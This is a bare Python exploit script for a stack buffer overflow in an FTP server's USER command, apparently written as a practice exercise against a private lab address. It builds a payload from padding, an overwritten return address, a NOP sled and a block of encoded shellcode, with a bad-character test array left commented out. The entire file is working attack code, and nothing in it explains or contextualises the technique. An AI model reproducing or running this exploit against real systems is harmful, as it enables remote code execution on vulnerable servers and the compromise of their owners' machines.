import socket
import struct

total = 900
offset = 230
new_eip = struct.pack("<I",0x762C2D4F)
nop_sled = b'\x90'*25
#Badchars \x00\x0a\x0d\x40
'''buf = b""
buf += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11"
buf += b"\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
buf += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
buf += b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e"
buf += b"\x3f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
buf += b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d"
buf += b"\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
buf += b"\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b"
buf += b"\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a"
buf += b"\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99"
buf += b"\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
buf += b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7"
buf += b"\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6"
buf += b"\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5"
buf += b"\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4"
buf += b"\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3"
buf += b"\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

all_characters = buf'''

buf =  b""
buf += b"\xb8\x52\xf6\x64\x6e\xdb\xdf\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x59\x83\xeb\xfc\x31\x43\x10\x03\x43\x10\xb0"
buf += b"\x03\x98\x86\xbb\xec\x61\x57\xa3\xdd\xb3\x33\xa8\x4c"
buf += b"\x04\x35\x4b\xfb\x36\x49\x18\xae\xa2\x5e\xa9\x05\xed"
buf += b"\x51\x2a\x12\x83\xb9\xe5\xe5\xc8\x86\x64\x9a\x12\xdb"
buf += b"\x46\xa3\xdc\x2e\x87\xe4\xaa\x45\x68\xb8\xa7\xf4\x66"
buf += b"\x6a\x33\xba\xba\x95\x93\xb0\x82\xed\x96\x07\x76\x42"
buf += b"\x98\x57\x26\xd1\xc2\x77\xc7\x36\x79\x3f\xdf\x3d\xb7"
buf += b"\xb4\xe3\x74\x79\xca\x90\xb3\xf2\x35\x70\x8a\xc4\xf7"
buf += b"\xb3\xe0\x68\xf6\x8c\xc3\x90\x8c\xe6\x37\x2c\x97\x3d"
buf += b"\x45\xea\x12\xa1\xed\x79\x84\x05\x0f\xad\x53\xce\x03"
buf += b"\x1a\x17\x88\x07\x9d\xf4\xa3\x3c\x16\xfb\x63\xb5\x6c"
buf += b"\xd8\xa7\x9d\x37\x41\xfe\x7b\x99\x7e\xe0\x24\x46\xdb"
buf += b"\x6b\xc6\x91\x5b\x94\x18\x9e\x01\x02\xd4\x53\xba\xd2"
buf += b"\x72\xe3\xc9\xe0\xdd\x5f\x46\x48\x95\x79\x91\xd9\xb1"
buf += b"\x79\x4d\x61\xd1\x87\x6e\x91\xfb\x43\x3a\xc1\x93\x62"
buf += b"\x43\x8a\x63\x8a\x96\x26\x6e\x1c\xd9\x1e\x6f\xd2\xb1"
buf += b"\x5c\x70\xf4\x20\xe9\x96\x58\xf3\xb9\x06\x19\xa3\x79"
buf += b"\xf7\xf1\xa9\x76\x28\xe1\xd1\x5d\x41\x88\x3d\x0b\x39"
buf += b"\x25\xa7\x16\xb1\xd4\x28\x8d\xbf\xd7\xa3\x27\x3f\x99"
buf += b"\x43\x42\x53\xce\x33\xac\xab\x0f\xd6\xac\xc1\x0b\x70"
buf += b"\xfb\x7d\x16\xa5\xcb\x21\xe9\x80\x48\x25\x15\x55\x78"
buf += b"\x5d\x20\xc3\xc4\x09\x4d\x03\xc4\xc9\x1b\x49\xc4\xa1"
buf += b"\xfb\x29\x97\xd4\x03\xe4\x84\x44\x96\x07\xfc\x39\x31"
buf += b"\x60\x02\x67\x75\x2f\xfd\x42\x05\x28\x01\x10\x22\x91"
buf += b"\x69\xea\x72\x21\x69\x80\x72\x71\x01\x5f\x5c\x7e\xe1"
buf += b"\xa0\x77\xd7\x69\x2a\x16\x95\x08\x2b\x33\x7b\x94\x2c"
buf += b"\xb0\xa0\x27\x56\xb9\x57\xc8\xa7\xd3\x33\xc9\xa7\xdb"
buf += b"\x45\xf6\x71\xe2\x33\x39\x42\x51\x4b\x0c\xe7\xf0\xc6"
buf += b"\x6e\xbb\x03\xc3"



shellcode = buf

s = socket.socket()
s.connect(('192.168.1.9',21))

print(s.recv(1024))

payload = [
    b'USER ',
    b'A'*int(offset),
    new_eip,
    nop_sled,
    shellcode,
    b'C'*(total - offset - len(new_eip) - len(nop_sled) - 2 - 5 - len(shellcode)),
    b'\r\n'
]

payload = b"".join(payload)
print(total - offset - len(new_eip) - len(nop_sled) - 2 - 5 - len(shellcode))
s.send(payload)
